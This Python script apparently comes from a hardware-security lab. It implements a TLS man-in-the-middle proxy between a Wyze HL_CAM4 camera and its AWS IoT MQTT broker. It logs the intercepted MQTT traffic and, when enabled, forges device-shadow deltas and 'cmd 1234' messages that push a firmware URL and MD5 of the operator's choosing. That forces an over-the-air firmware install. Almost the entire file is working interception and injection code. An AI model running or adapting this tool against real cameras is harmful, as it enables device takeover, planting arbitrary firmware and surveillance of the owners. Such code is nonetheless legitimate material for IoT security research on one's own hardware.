import socket, ssl, os, threading, time, json, struct
THING=os.environ.get("THING","80482c4bcf0b"); D=os.path.expanduser(os.environ.get("D","~/.config/fss-lab/wyze_iot/80482C4BCF0B"))
UP=("aws-iot.wyzecam.com",8883); SNI="a24rq1e5m4mtei.iot.us-west-2.amazonaws.com"
def up_ctx():
    c=ssl.create_default_context(cafile=D+"/rootCA.crt"); c.load_cert_chain(D+"/cert.pem",D+"/privkey.pem")
    c.set_alpn_protocols(["x-amzn-mqtt-ca"]); return c
def srv_ctx():
    c=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER); c.load_cert_chain("/tmp/serve443.pem")
    c.minimum_version=ssl.TLSVersion.TLSv1_2; c.maximum_version=ssl.TLSVersion.TLSv1_2
    c.set_ciphers("ECDHE+AESGCM:ECDHE+CHACHA20:ECDHE+AES")
    def sni(sock,name,ctx): print("SNI",name,flush=True)
    c.sni_callback=sni
    return c
def pipe(a,b,tag):
    try:
        while True:
            d=a.recv(65536)
            if not d: break
            if tag=="C": log("C->S",d)
            else: print("S->C type", d[0]>>4, flush=True)
            b.sendall(d)
    except Exception as e:
        print("pipe",tag,"end",repr(e),flush=True)
    finally:
        for s in (a,b):
            try: s.close()
            except Exception: pass
def log(direction,d):
    t=d[0]>>4
    if t==3:
        try:
            n=0; i=1
            while True:
                b=d[i]; i+=1; n=(n<<7)|(b&0x7f)
                if not b&0x80: break
            tl=int.from_bytes(d[i:i+2],'big'); topic=d[i+2:i+2+tl].decode(errors='replace')
            payload=d[i+2+tl:].decode(errors='replace')
            print(f"{direction} PUBLISH {topic} {payload[:300]}",flush=True)
        except Exception: print(direction,"PUBLISH <unparsed>",flush=True)
    elif t in (8,): print(direction,"SUBSCRIBE",flush=True)
    elif t in (1,): print(direction,"CONNECT",flush=True)
URL=os.environ.get("OTA_URL","https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/4.52.17.33.tar")
MD5=os.environ.get("OTA_MD5","")
def _enc(n):
    o=b""
    while True:
        d=n%128; n//=128; o+=bytes([d|(0x80 if n else 0)])
        if not n: return o
def _pkt(kind, body, flags=0):
    return bytes([(kind<<4)|flags])+_enc(len(body))+body
def _pub(sock, topic, payload, qos0=True):
    tb=topic.encode(); body=struct.pack(">H",len(tb))+tb+payload
    sock.sendall(_pkt(3, body, 0x00 if qos0 else 0x02))
def inject(cli):
    time.sleep(6)
    if not MD5:
        print("inject: OTA_MD5 unset",flush=True); return
    st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":"HL_CAM4","sub_mac":THING.upper()},"reported":{}},"version":999}
    try:
        _pub(cli, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
        print("inject: delta",flush=True)
    except Exception as e: print("inject delta fail",repr(e),flush=True); return
    time.sleep(10)
    for i in range(20):
        pl=json.dumps({"cmd":1234,"sub_mac":THING.upper(),"url":URL,"md5":MD5,"model":"HL_CAM4"}).encode()
        try:
            _pub(cli, f"hl/devices/{THING}/cmd", pl, qos0=False)
            print("inject: cmd 1234",flush=True)
        except Exception as e: print("inject cmd fail",repr(e),flush=True); return
        time.sleep(4)

LIVE={"c":None}
def injector():
    """Push the delta into whichever camera connection is live, retrying across reconnects."""
    time.sleep(4)
    if not MD5:
        print("inject: OTA_MD5 unset",flush=True); return
    st={"state":{"desired":{"url":URL,"md5":MD5,"pcUrl":URL,"pcMd5":MD5,"model":"HL_CAM4","sub_mac":THING.upper()},"reported":{}},"version":999}
    for _ in range(30):
        c=LIVE.get("c")
        if c:
            try:
                _pub(c, f"$aws/things/{THING}/shadow/name/{os.environ.get('SHADOW','wyze-service')}/update/delta", json.dumps(st).encode())
                print("inject: delta sent",flush=True); return
            except Exception as e: print("inject retry",repr(e),flush=True)
        time.sleep(3)
    print("inject: gave up",flush=True)

def up_addr():
    """Resolve the broker past our own DNS redirect (which would loop back to us)."""
    try:
        import subprocess
        ip=subprocess.run(["dig","+short","+time=2","@1.1.1.1",UP[0]],capture_output=True,text=True).stdout.split()
        for cand in ip:
            if cand and cand[0].isdigit(): return (cand, UP[1])
    except Exception: pass
    return UP

def handle(cli):
    try:
        u=up_ctx().wrap_socket(socket.create_connection(up_addr(),timeout=10),server_hostname=SNI)
        print("UP ok",flush=True)
    except Exception as e: print("upstream fail",repr(e),flush=True); cli.close(); return
    threading.Thread(target=pipe,args=(cli,u,"C"),daemon=True).start()
    LIVE["c"]=cli
    if os.environ.get("INJECT"):
        threading.Thread(target=inject,args=(cli,),daemon=True).start()
    pipe(u,cli,"S")
def main():
    ctx=srv_ctx(); s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("0.0.0.0",8883)); s.listen(4); print("proxy on 8883",flush=True)
    while True:
        c,_=s.accept()
        try: c=ctx.wrap_socket(c,server_side=True)
        except Exception as e: print("tls fail",e,flush=True); continue
        threading.Thread(target=handle,args=(c,),daemon=True).start()
main()
